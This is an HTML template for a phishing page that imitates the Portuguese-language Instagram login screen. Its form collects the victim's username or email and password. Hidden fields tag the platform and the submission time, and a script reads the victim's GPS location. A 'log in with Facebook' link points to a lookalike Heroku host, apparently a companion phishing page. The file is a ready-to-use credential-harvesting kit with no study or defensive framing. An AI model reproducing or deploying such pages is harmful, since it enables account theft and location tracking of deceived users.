<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../static/assets/styles.css" />
    <link rel="icon" href="../static/assets/Instagram_icon.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="../static/assets/instagram-logo.png" alt="Instagram logo" title="Instagram logo"/>
                </h1>
                <form method="POST">
                    <input type="hidden" name="platform" value="Instagram">
                    <input type="hidden" name="date" value="" id="timeHolder">
                    <input type="hidden" name="location" value="" id="locationHolder">

                    <input type="text" name="email" placeholder="Telefone, nome de usuário ou e-mail"/>
                    <input name="password" type="password" placeholder="Senha"/>

                    <input type="submit" value="Entrar">
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="https://login--facebook.herokuapp.com/">Entrar com o facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/?hl=pt-br">Esqueceu a senha?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/?hl=pt-br">Cadastre-se</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <a href="https://itunes.apple.com/app/instagram/"><img src="../static/assets/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" /></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="../static/assets/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" /></a>
                </div>
            </div>
        </section>
    </main>

    <script>
        	if (navigator.geolocation)
            {
              navigator.geolocation.getCurrentPosition(pos);
            }

          function pos(position) {
            let pos = "";
            pos += position.coords.latitude;
            pos += " ";
            pos += position.coords.longitude;
            document.getElementById("locationHolder").value = pos;
          }

          let today = new Date()
          let time = `${today.getDate()}/${today.getMonth() + 1}, às ${today.getHours()}:${today.getMinutes()}`
          document.getElementById("timeHolder").value = time;
    </script>
</body>
</html>
